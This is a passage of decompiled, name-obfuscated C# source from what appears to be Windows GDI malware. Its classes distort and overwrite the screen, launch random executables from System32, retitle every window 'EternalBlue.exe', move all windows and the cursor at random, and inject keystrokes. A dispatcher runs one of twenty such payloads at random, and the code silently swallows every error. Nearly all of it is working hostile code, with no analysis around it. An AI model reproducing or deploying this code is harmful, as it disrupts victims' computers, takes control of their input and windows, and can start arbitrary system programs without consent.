		{
			return A_0.Bounds;
		}

		// Token: 0x0400004F RID: 79
		private new int Field0;

		// Token: 0x04000050 RID: 80
		private new int Field1;
	}

	// Token: 0x02000020 RID: 32
	private class Class25 : Class6.Class34
	{
		// Token: 0x06000101 RID: 257 RVA: 0x00007AE0 File Offset: 0x00005CE0
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
				IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
				Class6.SelectObject(intPtr, intPtr2);
				Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
				for (int i = 0; i < 500; i++)
				{
					int num = Class6.Class25.StaticMethod0(this.Field1, -this.Field2, this.Field2 + this.Field2);
					int num2 = Class6.Class25.StaticMethod0(this.Field1, -this.Field3, this.Field3 + this.Field3);
					int a_ = Class6.Class25.StaticMethod0(this.Field1, -this.Field2, this.Field2 + this.Field2);
					int a_2 = Class6.Class25.StaticMethod0(this.Field1, -this.Field3, this.Field3 + this.Field3);
					Class6.BitBlt(intPtr, num, num2, a_, a_2, intPtr, num + Class6.Class25.StaticMethod0(this.Field1, -1, 2), num2 + Class6.Class25.StaticMethod0(this.Field1, -1, 2), 13369376);
				}
				Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 15597702);
				Class6.DeleteObject(intPtr);
				Class6.DeleteObject(intPtr2);
				Class6.Class25.StaticMethod2(Class6.Class25.StaticMethod1(this.Field1, 10));
			}
			catch
			{
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod1(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x06000105 RID: 261 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod2(int A_0)
		{
			Thread.Sleep(A_0);
		}

		// Token: 0x04000051 RID: 81
		private new int Field0;
	}

	// Token: 0x02000021 RID: 33
	private class Class26 : Class6.Class34
	{
		// Token: 0x06000106 RID: 262 RVA: 0x00007C58 File Offset: 0x00005E58
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				int num = Class6.Class26.StaticMethod0(this.Field1, 1, 4);
				Rectangle rect = new Rectangle(Class6.Class26.StaticMethod0(this.Field1, 1, this.Field2), Class6.Class26.StaticMethod0(this.Field1, 1, this.Field3), Class6.Class26.StaticMethod0(this.Field1, 1, this.Field2), Class6.Class26.StaticMethod0(this.Field1, 1, this.Field3));
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
				Graphics.FromImage(bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.SmoothingMode = SmoothingMode.HighSpeed;
				graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
				LinearGradientBrush brush = new LinearGradientBrush(rect, Color.FromArgb(0, 0, this.Field1.Next(255)), Color.FromArgb(0, 0, this.Field1.Next(255)), (LinearGradientMode)this.Field1.Next(4));
				Point point = new Point(this.Field1.Next(this.Field2), this.Field1.Next(this.Field3));
				Point point2 = new Point(this.Field1.Next(this.Field2), this.Field1.Next(this.Field3));
				Point point3 = new Point(this.Field1.Next(this.Field2), this.Field1.Next(this.Field3));
				Point[] points = new Point[]
				{
					point,
					point2,
					point3
				};
				if (num == 1)
				{
					graphics.FillPolygon(brush, points);
				}
				else if (num != 2)
				{
					if (num == 3)
					{
						graphics.FillPie(brush, this.Field1.Next(this.Field2), this.Field1.Next(this.Field3), this.Field1.Next(this.Field2), this.Field1.Next(this.Field3), this.Field1.Next(-360, 360), this.Field1.Next(-360, 360));
					}
				}
				else
				{
					graphics.FillEllipse(brush, this.Field1.Next(this.Field2), this.Field1.Next(this.Field3), this.Field1.Next(this.Field2), this.Field1.Next(this.Field3));
				}
				Bitmap bitmap2 = new Bitmap(bitmap);
				IntPtr hdc = Graphics.FromHdc(Class6.GetDC(IntPtr.Zero)).GetHdc();
				IntPtr intPtr = Class6.CreateCompatibleDC(hdc);
				Class6.SelectObject(intPtr, bitmap2.GetHbitmap());
				Class6.BitBlt(hdc, 0, 0, bitmap2.Width, bitmap2.Height, intPtr, 0, 0, 13369376);
				Class6.DeleteObject(hdc);
				Class6.DeleteObject(intPtr);
				Thread.Sleep(this.Field1.Next(50));
			}
			catch
			{
			}
		}

		// Token: 0x06000108 RID: 264 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x04000052 RID: 82
		private new int Field0;
	}

	// Token: 0x02000022 RID: 34
	private class Class27 : Class6.Class34
	{
		// Token: 0x06000109 RID: 265 RVA: 0x00007FA8 File Offset: 0x000061A8
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
				IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
				Class6.SelectObject(intPtr, intPtr2);
				Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
				for (int i = 0; i < this.Field2; i++)
				{
					Class6.BitBlt(intPtr, i, 0, 1, this.Field3, intPtr, i, -this.Field2 - Class6.Class27.StaticMethod0(this.Field1, -10, 11), 13369376);
					Class6.BitBlt(intPtr, i, 0, 1, this.Field3, intPtr, i, this.Field2 + Class6.Class27.StaticMethod0(this.Field1, -10, 11), 13369376);
					Class6.BitBlt(intPtr, i, 0, 1, this.Field3, intPtr, i, Class6.Class27.StaticMethod0(this.Field1, -10, 11), 13369376);
				}
				Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
				Class6.DeleteObject(intPtr);
				Class6.DeleteObject(intPtr2);
				Class6.Class27.StaticMethod2(Class6.Class27.StaticMethod1(this.Field1, 50));
			}
			catch
			{
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x0600010C RID: 268 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod1(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x0600010D RID: 269 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod2(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000023 RID: 35
	private class Class28 : Class6.Class34
	{
		// Token: 0x0600010E RID: 270 RVA: 0x000080EC File Offset: 0x000062EC
		public virtual void Method0(IntPtr A_1)
		{
			Class6.Class34 @class = new Class6.Class8();
			Class6.Class34 class2 = new Class6.Class9();
			Class6.Class34 class3 = new Class6.Class10();
			Class6.Class34 class4 = new Class6.Class11();
			Class6.Class34 class5 = new Class6.Class12();
			Class6.Class34 class6 = new Class6.Class13();
			Class6.Class34 class7 = new Class6.Class14();
			Class6.Class34 class8 = new Class6.Class15();
			Class6.Class34 class9 = new Class6.Class16();
			Class6.Class34 class10 = new Class6.Class17();
			Class6.Class34 class11 = new Class6.Class18();
			Class6.Class34 class12 = new Class6.Class19();
			Class6.Class34 class13 = new Class6.Class20();
			Class6.Class34 class14 = new Class6.Class21();
			Class6.Class34 class15 = new Class6.Class22();
			Class6.Class34 class16 = new Class6.Class23();
			Class6.Class34 class17 = new Class6.Class24();
			Class6.Class34 class18 = new Class6.Class25();
			Class6.Class34 class19 = new Class6.Class26();
			Class6.Class34 class20 = new Class6.Class27();
			int num = Class6.Class28.StaticMethod0(this.Field1, 1, 21);
			if (num == 1)
			{
				@class.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				@class.Method1();
				return;
			}
			if (num == 2)
			{
				class2.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class2.Method1();
				return;
			}
			if (num == 3)
			{
				class3.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class3.Method1();
				return;
			}
			if (num == 4)
			{
				class4.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class4.Method1();
				return;
			}
			if (num == 5)
			{
				class5.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class5.Method1();
				return;
			}
			if (num == 6)
			{
				class6.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class6.Method1();
				return;
			}
			if (num == 7)
			{
				class7.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class7.Method1();
				return;
			}
			if (num == 8)
			{
				class8.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class8.Method1();
				return;
			}
			if (num == 9)
			{
				class9.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class9.Method1();
				return;
			}
			if (num == 10)
			{
				class10.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class10.Method1();
				return;
			}
			if (num == 11)
			{
				class11.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class11.Method1();
				return;
			}
			if (num == 12)
			{
				class12.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class12.Method1();
				return;
			}
			if (num == 13)
			{
				class13.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class13.Method1();
				return;
			}
			if (num == 14)
			{
				class14.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class14.Method1();
				return;
			}
			if (num == 15)
			{
				class15.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class15.Method1();
				return;
			}
			if (num == 16)
			{
				class16.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class16.Method1();
				return;
			}
			if (num == 17)
			{
				class17.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class17.Method1();
				return;
			}
			if (num == 18)
			{
				class18.Method0();
				Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
				class18.Method1();
				return;
			}
			if (num != 19)
			{
				if (num == 20)
				{
					class20.Method0();
					Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
					class20.Method1();
				}
				return;
			}
			class19.Method0();
			Class6.Class28.StaticMethod2(Class6.Class28.StaticMethod1(this.Field1, 30000));
			class19.Method1();
		}

		// Token: 0x06000110 RID: 272 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod1(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x06000112 RID: 274 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod2(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000024 RID: 36
	private class Class29 : Class6.Class34
	{
		// Token: 0x06000113 RID: 275 RVA: 0x000084DC File Offset: 0x000066DC
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				Random a_ = Class6.Class29.StaticMethod0();
				string[] array = Class6.Class29.StaticMethod1("c:\\Windows\\System32");
				Class6.Class29.StaticMethod3(array[Class6.Class29.StaticMethod2(a_, array.Length)]);
				Class6.Class29.StaticMethod5(Class6.Class29.StaticMethod4(this.Field1, 0, 60000));
			}
			catch
			{
			}
		}

		// Token: 0x06000115 RID: 277 RVA: 0x00005BE0 File Offset: 0x00003DE0
		static Random StaticMethod0()
		{
			return new Random();
		}

		// Token: 0x06000116 RID: 278 RVA: 0x00008538 File Offset: 0x00006738
		static string[] StaticMethod1(string A_0)
		{
			return Directory.GetFiles(A_0);
		}

		// Token: 0x06000117 RID: 279 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod2(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x06000118 RID: 280 RVA: 0x0000854C File Offset: 0x0000674C
		static Process StaticMethod3(string A_0)
		{
			return Process.Start(A_0);
		}

		// Token: 0x06000119 RID: 281 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod4(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x0600011A RID: 282 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod5(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000025 RID: 37
	private class Class30 : Class6.Class34
	{
		// Token: 0x0600011B RID: 283 RVA: 0x00008560 File Offset: 0x00006760
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				Class6.Class30.StaticMethod0();
				foreach (Process a_ in Class6.Class30.StaticMethod1())
				{
					IntPtr intPtr = Class6.Class30.StaticMethod2(a_);
					if (intPtr != IntPtr.Zero)
					{
						Class6.SetWindowText(Class6.GetForegroundWindow(), "EternalBlue.exe");
						Class6.SetWindowText(Class6.Class30.StaticMethod3(a_), "EternalBlue.exe");
						Class6.SetWindowText(intPtr, "EternalBlue.exe");
						Class6.Class30.StaticMethod4(10000);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600011D RID: 285 RVA: 0x000085EC File Offset: 0x000067EC
		static Process StaticMethod0()
		{
			return new Process();
		}

		// Token: 0x0600011E RID: 286 RVA: 0x00008600 File Offset: 0x00006800
		static Process[] StaticMethod1()
		{
			return Process.GetProcesses();
		}

		// Token: 0x0600011F RID: 287 RVA: 0x00008614 File Offset: 0x00006814
		static IntPtr StaticMethod2(Process A_0)
		{
			return A_0.MainWindowHandle;
		}

		// Token: 0x06000120 RID: 288 RVA: 0x00005C60 File Offset: 0x00003E60
		static IntPtr StaticMethod3(Process A_0)
		{
			return A_0.Handle;
		}

		// Token: 0x06000121 RID: 289 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod4(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000026 RID: 38
	private class Class31 : Class6.Class34
	{
		// Token: 0x06000122 RID: 290 RVA: 0x00008628 File Offset: 0x00006828
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				Random a_ = Class6.Class31.StaticMethod0();
				string a_2 = "EternalBlue.exe";
				char[] array = new char[1];
				Random a_3 = Class6.Class31.StaticMethod0();
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = Class6.Class31.StaticMethod3(a_2, Class6.Class31.StaticMethod2(a_3, Class6.Class31.StaticMethod1(a_2)));
				}
				Class6.Class31.StaticMethod5(Class6.Class31.StaticMethod4(array));
				Class6.Class31.StaticMethod6(Class6.Class31.StaticMethod2(a_, 0));
			}
			catch
			{
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x00005BE0 File Offset: 0x00003DE0
		static Random StaticMethod0()
		{
			return new Random();
		}

		// Token: 0x06000125 RID: 293 RVA: 0x000086A4 File Offset: 0x000068A4
		static int StaticMethod1(string A_0)
		{
			return A_0.Length;
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod2(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x06000127 RID: 295 RVA: 0x000024CC File Offset: 0x000006CC
		static char StaticMethod3(string A_0, int A_1)
		{
			return A_0[A_1];
		}

		// Token: 0x06000128 RID: 296 RVA: 0x000086B8 File Offset: 0x000068B8
		static string StaticMethod4(char[] A_0)
		{
			return new string(A_0);
		}

		// Token: 0x06000129 RID: 297 RVA: 0x000086CC File Offset: 0x000068CC
		static void StaticMethod5(string A_0)
		{
			SendKeys.SendWait(A_0);
		}

		// Token: 0x0600012A RID: 298 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod6(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000027 RID: 39
	private class Class32 : Class6.Class34
	{
		// Token: 0x0600012B RID: 299 RVA: 0x000086E0 File Offset: 0x000068E0
		public virtual void Method0(IntPtr A_1)
		{
			Class6.Class32.StaticMethod0();
			foreach (Process a_ in Class6.Class32.StaticMethod1())
			{
				try
				{
					Class6.Class32.StaticMethod3("Process Name: {0} ", Class6.Class32.StaticMethod2(a_));
					IntPtr intPtr = Class6.Class32.StaticMethod4(a_);
					if (intPtr != IntPtr.Zero)
					{
						Class6.Class32.StaticMethod5();
						Class6.MoveWindow(Class6.GetForegroundWindow(), Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), true);
						Class6.MoveWindow(intPtr, Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), true);
						Class6.MoveWindow(Class6.Class32.StaticMethod7(a_), Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), true);
						Class6.MoveWindow(A_1, Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), Class6.Class32.StaticMethod6(this.Field1, this.Field2), Class6.Class32.StaticMethod6(this.Field1, this.Field3), true);
						Class6.Class32.StaticMethod9(Class6.Class32.StaticMethod8(this.Field1, 0, 10000));
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600012D RID: 301 RVA: 0x000085EC File Offset: 0x000067EC
		static Process StaticMethod0()
		{
			return new Process();
		}

		// Token: 0x0600012E RID: 302 RVA: 0x00008600 File Offset: 0x00006800
		static Process[] StaticMethod1()
		{
			return Process.GetProcesses();
		}

		// Token: 0x0600012F RID: 303 RVA: 0x000088B0 File Offset: 0x00006AB0
		static string StaticMethod2(Process A_0)
		{
			return A_0.ProcessName;
		}

		// Token: 0x06000130 RID: 304 RVA: 0x000088C4 File Offset: 0x00006AC4
		static void StaticMethod3(string A_0, object A_1)
		{
			Console.WriteLine(A_0, A_1);
		}

		// Token: 0x06000131 RID: 305 RVA: 0x00008614 File Offset: 0x00006814
		static IntPtr StaticMethod4(Process A_0)
		{
			return A_0.MainWindowHandle;
		}

		// Token: 0x06000132 RID: 306 RVA: 0x00005BE0 File Offset: 0x00003DE0
		static Random StaticMethod5()
		{
			return new Random();
		}

		// Token: 0x06000133 RID: 307 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod6(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x06000134 RID: 308 RVA: 0x00005C60 File Offset: 0x00003E60
		static IntPtr StaticMethod7(Process A_0)
		{
			return A_0.Handle;
		}

		// Token: 0x06000135 RID: 309 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod8(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x06000136 RID: 310 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod9(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000028 RID: 40
	private class Class33 : Class6.Class34
	{
		// Token: 0x06000137 RID: 311 RVA: 0x000088D8 File Offset: 0x00006AD8
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				Cursor.Position = new Point(Class6.Class33.StaticMethod0(this.Field1, this.Field2), Class6.Class33.StaticMethod0(this.Field1, this.Field3));
				Class6.StaticMethod0();
				Thread.Sleep(this.Field1.Next(0, 1000));
			}
			catch
			{
			}
			Thread.Sleep(0);
		}

		// Token: 0x06000139 RID: 313 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod0(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}
	}

	// Token: 0x02000029 RID: 41
	private abstract class Class34
	{
		// Token: 0x0600013A RID: 314 RVA: 0x00008948 File Offset: 0x00006B48
		public void Method0()
		{
			if (!this.Field0)
			{
				this.Field0 = true;
				Class6.Class34.StaticMethod1(Class6.Class34.StaticMethod0(new ThreadStart(this.Method2)));
			}
		}

		// Token: 0x0600013B RID: 315 RVA: 0x0000897C File Offset: 0x00006B7C
		public void Method1()
		{
			this.Field0 = false;
		}

		// Token: 0x0600013C RID: 316 RVA: 0x00008990 File Offset: 0x00006B90
		private void Method2()
		{
			while (this.Field0)
			{
				IntPtr dc = Class6.GetDC(IntPtr.Zero);
				this.Method4(dc);
				Class6.ReleaseDC(IntPtr.Zero, dc);
			}
		}

		// Token: 0x0600013D RID: 317 RVA: 0x000089C8 File Offset: 0x00006BC8
		public void Method3()
		{
			Class6.RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, Class6.Enum0.Invalidate | Class6.Enum0.Erase | Class6.Enum0.AllChildren);
		}

		// Token: 0x0600013E RID: 318
		public abstract void Method4(IntPtr A_1);

		// Token: 0x06000140 RID: 320 RVA: 0x00008A40 File Offset: 0x00006C40
		static Thread StaticMethod0(ThreadStart A_0)
		{
			return new Thread(A_0);
		}

		// Token: 0x06000141 RID: 321 RVA: 0x00008A54 File Offset: 0x00006C54
		static void StaticMethod1(Thread A_0)
		{
			A_0.Start();
		}

		// Token: 0x06000142 RID: 322 RVA: 0x00005BE0 File Offset: 0x00003DE0
		static Random StaticMethod2()
		{
			return new Random();
		}

		// Token: 0x06000143 RID: 323 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod3()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod4(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x04000053 RID: 83
		public bool Field0;

		// Token: 0x04000054 RID: 84
		public Random Field1 = Class6.Class34.StaticMethod2();

		// Token: 0x04000055 RID: 85
		public int Field2 = Class6.Class34.StaticMethod4(Class6.Class34.StaticMethod3()).Width;

		// Token: 0x04000056 RID: 86
		public int Field3 = Screen.PrimaryScreen.Bounds.Height;
	}

	// Token: 0x0200002A RID: 42
	[Flags]
	private enum Enum0 : uint
	{
		// Token: 0x04000058 RID: 88
		Invalidate = 1U,
		// Token: 0x04000059 RID: 89
		InternalPaint = 2U,
		// Token: 0x0400005A RID: 90
		Erase = 4U,
		// Token: 0x0400005B RID: 91
		Validate = 8U,
		// Token: 0x0400005C RID: 92
		NoInternalPaint = 16U,
		// Token: 0x0400005D RID: 93
		NoErase = 32U,
		// Token: 0x0400005E RID: 94
		NoChildren = 64U,
		// Token: 0x0400005F RID: 95
		AllChildren = 128U,
		// Token: 0x04000060 RID: 96
		UpdateNow = 256U,
		// Token: 0x04000061 RID: 97
		EraseNow = 512U,
		// Token: 0x04000062 RID: 98
		Frame = 1024U,
		// Token: 0x04000063 RID: 99
		NoFrame = 2048U
	}

	// Token: 0x0200002B RID: 43
	public struct Struct6
	{
		// Token: 0x04000064 RID: 100
		public byte Field0;

		// Token: 0x04000065 RID: 101
		public byte Field1;

		// Token: 0x04000066 RID: 102
		public byte Field2;

		// Token: 0x04000067 RID: 103
		public byte Field3;
	}

	// Token: 0x0200002C RID: 44
	public struct Struct7
	{
		// Token: 0x06000145 RID: 325 RVA: 0x00008A68 File Offset: 0x00006C68
		public Struct7(int A_1, int A_2)
		{
			this.Field0 = A_1;
			this.Field1 = A_2;
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00008A84 File Offset: 0x00006C84
		public static Point StaticMethod0(Class6.Struct7 A_0)
		{
			return new Point(A_0.Field0, A_0.Field1);
		}

		// Token: 0x06000147 RID: 327 RVA: 0x00008AA4 File Offset: 0x00006CA4
		public static Class6.Struct7 StaticMethod1(Point A_0)
		{
			return new Class6.Struct7(A_0.X, A_0.Y);
		}

		// Token: 0x04000068 RID: 104
		public int Field0;

		// Token: 0x04000069 RID: 105
		public int Field1;
	}
}
